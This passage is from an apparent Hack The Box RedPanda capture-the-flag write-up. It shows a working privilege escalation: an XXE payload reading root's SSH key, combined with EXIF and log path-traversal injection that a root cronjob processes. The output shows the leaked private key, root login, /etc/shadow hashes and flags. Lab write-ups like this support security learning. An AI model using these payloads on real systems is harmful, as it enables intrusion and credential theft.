    final-1.0-jar-with-dependencies.jar is vulnerable to multiple path traversal vulnerabilities and to XXE Injection, allowing to exfiltrate restricted data.
    
    Enumerated root ssh access:
    
    ```bash
    woodenk@redpanda:/dev/shm$ cat /etc/ssh/sshd_config | grep -v '#' | grep .
    Include /etc/ssh/sshd_config.d/*.conf
    PermitRootLogin yes
    ChallengeResponseAuthentication no
    UsePAM yes
    X11Forwarding yes
    PrintMotd no
    AcceptEnv LANG LC_*
    Subsystem sftp  /usr/lib/openssh/sftp-server
    PasswordAuthentication yes
    ```
    

## Mulitple path traversal leading to XXE in jdom2

Copied and modified an already existing XML file in order to contain XXE:

```bash
woodenk@redpanda:/dev/shm/expl$ cp /credits/woodenk_creds.xml bro_creds.xml
woodenk@redpanda:/dev/shm/expl$ nano bro_creds.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///root/.ssh/id_rsa"> ]>
<credits>
  <author>&ent;</author>
  <image>
    <uri>/img/greg.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/hungy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smooch.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smiley.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
```

Generated an image containing a path traversal inside the Autor EXIF data and uploaded it on the target:

```
┌──(kali㉿kali)-[~/…/HTB/B2R/RedPanda/exploit]
└─$ exiftool greg.jpg -Artist='../../../../../dev/shm/expl/bro'
Warning: [minor] Ignored empty rdf:Bag list for Iptc4xmpExt:LocationCreated - greg.jpg
    1 image files updated
...
woodenk@redpanda:/dev/shm/expl$ ls
bro_creds.xml  greg.jpg
```

Poisoned the log file with a path traversal referencing the custom uploaded image:

```
woodenk@redpanda:/dev/shm/expl$ echo '200||10.10.14.102||null||/../../../../../../../../dev/shm/expl/greg.jpg' > /opt/panda_search/redpanda.log
woodenk@redpanda:/dev/shm/expl$ cat /opt/panda_search/redpanda.log
200||10.10.14.102||null||/../../../../../../../../dev/shm/expl/greg.jpg
```

Waited for the cronjob and extracted the root ssh key:

```
...
2022/07/10 09:22:01 CMD: UID=0    PID=60089  | java -jar /opt/credit-score/LogParser/final/target/final-1.0-jar-with-dependencies.jar
...
woodenk@redpanda:/dev/shm/expl$ cat bro_creds.xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace>
<credits>
  <author>-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
-----END OPENSSH PRIVATE KEY-----</author>
  <image>
    <uri>/img/greg.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/hungy.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smooch.jpg</uri>
    <views>0</views>
  </image>
  <image>
    <uri>/img/smiley.jpg</uri>
    <views>0</views>
  </image>
  <totalviews>0</totalviews>
</credits>
```

Logged in using root private key:

```bash
┌──(kali㉿kali)-[~/…/HTB/B2R/RedPanda/loot]
└─$ ssh2john root
root has no password!

┌──(kali㉿kali)-[~/…/HTB/B2R/RedPanda/loot]
└─$ ssh root@10.129.195.141 -i root
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun 10 Jul 2022 01:54:37 PM UTC

  System load:           0.02
  Usage of /:            84.7% of 4.30GB
  Memory usage:          63%
  Swap usage:            0%
  Processes:             225
  Users logged in:       1
  IPv4 address for eth0: 10.129.195.141
  IPv6 address for eth0: dead:beef::250:56ff:feb9:c537

0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Thu Jun 30 13:17:41 2022
root@redpanda:~# cat /root/root.txt ; id; cat /etc/shadow | grep '\$'
e9d91d692ba0062fb90be10a95fc6ead
uid=0(root) gid=0(root) groups=0(root)
root:$6$HYdGmG45Ye119KMJ$XKsSsbWxGmfYk38VaKlJkaLomoPUzkL/l4XNJN3PuXYAYebnSz628ii4VLWfEuPShcAEpQRjhl.vi0MrJAC8x0:19157:0:99999:7:::
woodenk:$6$48BoRAl2LvBK8Zth$vpJzroFTUyQRA/UQKu64uzNF6L7pceYAe.B14kmSgvKCvjTm6Iu/hSEZTTT8EFbGKNIbT3e2ox3qqK/MJRJIJ1:19157:0:99999:7:::
```

![RedPanda%2049fd8db7bf3640e48b6607595ed300b3](../../zzz_res/attachments/RedPanda%2049fd8db7bf3640e48b6607595ed300b3%208.png)

# Trophy

![RedPanda%2049fd8db7bf3640e48b6607595ed300b3](../../zzz_res/attachments/RedPanda%2049fd8db7bf3640e48b6607595ed300b3%209.png)

>[!success]
>**User.txt**
>fef3c92a4b1ae1ec0f2fda764da47892

>[!success]
>**Root.txt**
e9d91d692ba0062fb90be10a95fc6ead

**/etc/shadow**

```bash
root:$6$HYdGmG45Ye119KMJ$XKsSsbWxGmfYk38VaKlJkaLomoPUzkL/l4XNJN3PuXYAYebnSz628ii4VLWfEuPShcAEpQRjhl.vi0MrJAC8x0:19157:0:99999:7:::
woodenk:$6$48BoRAl2LvBK8Zth$vpJzroFTUyQRA/UQKu64uzNF6L7pceYAe.B14kmSgvKCvjTm6Iu/hSEZTTT8EFbGKNIbT3e2ox3qqK/MJRJIJ1:19157:0:99999:7:::
```